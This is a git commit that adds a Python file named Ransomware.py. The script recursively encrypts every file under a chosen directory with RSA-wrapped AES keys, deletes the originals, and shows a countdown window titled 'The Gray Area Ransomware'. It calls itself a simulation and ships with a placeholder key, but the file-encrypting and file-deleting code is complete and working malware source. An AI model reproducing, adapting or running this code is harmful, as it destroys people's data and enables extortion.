b942b72a5245024c087655e2209695c95ceab88b
Agustín Alexander Turchetti Sahajdachy <69662336+agustur@users.noreply.github.com>
2023-10-11 09:18:16 -0300

    Add files via upload

---
+++ virus/Ransomware.py
@@ -0,0 +1,112 @@
+import base64
+import os
+from pathlib import Path
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP, AES
+import tkinter as tk
+
+# public key with base64 encoding
+pubKey = '''REPLACE ME WITH YOUR PUBLIC KEY FROM YOUR PUBLIC KEYFILE'''
+pubKey = base64.b64decode(pubKey)
+
+
+def scanRecurse(baseDir):
+    '''
+    Scan a directory and return a list of all files
+    return: list of files
+    '''
+    for entry in os.scandir(baseDir):
+        if entry.is_file():
+            yield entry
+        else:
+            yield from scanRecurse(entry.path)
+
+
+def encrypt(dataFile, publicKey):
+    '''
+    Input: path to file to encrypt, public key
+    Output: encrypted file with extension .L0v3sh3 and remove original file
+    use EAX mode to allow detection of unauthorized modifications
+    '''
+    # read data from file
+    extension = dataFile.suffix.lower()
+    dataFile = str(dataFile)
+    with open(dataFile, 'rb') as f:
+        data = f.read()
+    
+    # convert data to bytes
+    data = bytes(data)
+
+    # create public key object
+    key = RSA.import_key(publicKey)
+    sessionKey = os.urandom(16)
+
+    # encrypt the session key with the public key
+    cipher = PKCS1_OAEP.new(key)
+    encryptedSessionKey = cipher.encrypt(sessionKey)
+
+    # encrypt the data with the session key
+    cipher = AES.new(sessionKey, AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(data)
+
+    # save the encrypted data to file
+    fileName= dataFile.split(extension)[0]
+    fileExtension = '.tga'
+    encryptedFile = fileName + fileExtension
+    with open(encryptedFile, 'wb') as f:
+        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
+    os.remove(dataFile)
+
+
+# change directory to the directory of the script
+# keep secure of changing the directory,
+# DONT RUN THIS SCRIPT ON YOUR PC
+directory = '../' # CHANGE THIS
+excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
+for item in scanRecurse(directory): 
+    filePath = Path(item)
+    fileType = filePath.suffix.lower()
+
+    if fileType in excludeExtension:
+        continue
+    encrypt(filePath, pubKey)
+
+
+
+
+def countdown(count):
+    # change text in label
+    # count = '01:30:00'
+    hour, minute, second = count.split(':')
+    hour = int(hour)
+    minute = int(minute)
+    second = int(second)
+
+    label['text'] = '{}:{}:{}'.format(hour, minute, second)
+
+    if second > 0 or minute > 0 or hour > 0:
+        # call countdown again after 1000ms (1s)
+        if second > 0:
+            second -= 1
+        elif minute > 0:
+            minute -= 1
+            second = 59
+        elif hour > 0:
+            hour -= 1
+            minute = 59
+            second = 59
+        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 
+
+root = tk.Tk()
+root.title('The Gray Area Ransomware')
+root.geometry('500x300')
+root.resizable(False, False)
+label1 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n', font=('calibri', 12,'bold'))
+label1.pack()
+label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
+label.pack()
+
+# call countdown first time    
+countdown('01:30:00')
+# root.after(0, countdown, 5)
+root.mainloop()
